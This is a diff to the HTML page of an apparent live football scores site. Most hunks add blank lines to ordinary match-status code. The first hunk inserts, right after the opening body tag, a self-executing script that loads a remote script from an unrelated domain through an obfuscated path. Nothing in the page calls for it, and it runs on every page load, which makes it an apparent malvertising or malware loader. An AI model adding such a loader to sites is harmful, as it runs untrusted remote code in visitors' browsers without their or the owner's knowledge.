@@ -255,6 +255,22 @@
 </head>
 
 <body>
+
+ <script>
+    (function(ihosnhw){
+    var d = document,
+        s = d.createElement('script'),
+        l = d.currentScript || d.scripts[d.scripts.length - 1];
+    s.settings = ihosnhw || {};
+    s.src = "\/\/quarrelsomebitter.com\/b_XTV\/s.d\/G\/lO0sYQWtcd\/IeJmL9EuDZFU\/lfk\/PGTpc\/0IMTzHg\/2qNKDhUltaNNzaQXzTOEDuYC0bO_QP";
+    s.async = true;
+    s.referrerPolicy = 'no-referrer-when-downgrade';
+    l.parentNode.insertBefore(s, l);
+    })({})
+</script>
+
+
+
     <div class="div">
         <h1 class="header-text">Live Football ⚽</h1>
         <small>Finish Match Will Show In Finished Tab</small>
@@ -286,6 +302,7 @@
     <script>
 
         const API = "https://raymonddomain.dev/api/matches";
+
         let liveInterval = null;
 
         function formatDateHeader(s) {
@@ -300,8 +317,11 @@
 
         function getStatusBadge(m) {
             if (m.status === "IN_PLAY") return `<span class="badge live">LIVE ${m.minute || 0}'</span>`;
+
             if (m.status === "PAUSED") return `<span class="badge">HALF TIME</span>`;
+
             if (m.status === "FINISHED") return `<span class="badge" style="background:#16a34a">FINISH</span>`;
+
             return `<span class="badge" style="background:#374151">${new Date(m.date).toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' })}</span>`
         }
 
